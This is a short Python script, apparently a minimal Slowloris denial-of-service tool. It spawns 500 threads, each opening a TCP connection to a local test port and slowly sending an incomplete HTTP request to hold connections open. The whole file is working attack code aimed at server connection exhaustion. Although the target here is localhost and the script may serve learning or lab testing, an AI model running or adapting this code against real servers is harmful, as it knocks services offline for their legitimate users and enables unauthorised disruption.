import socket
import time
from threading import Thread


headers = b"GET / HTTP/1.1\n"

def create_socket(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s




def attack():
    HOST = "127.0.0.1"
    PORT = 1337 
    s = create_socket(HOST, PORT)
    counter = 0
    while counter < 5:
        s.send(headers)
        # print(f"Sent: {headers}")
        time.sleep(5)

        counter += 1


print("Starting SlowLoris ...")

socket_count = 500
threads = [Thread(target=attack) for _ in range(socket_count)]
print(f"{socket_count} sockets created!")
for thread in threads:
    thread.start()

    



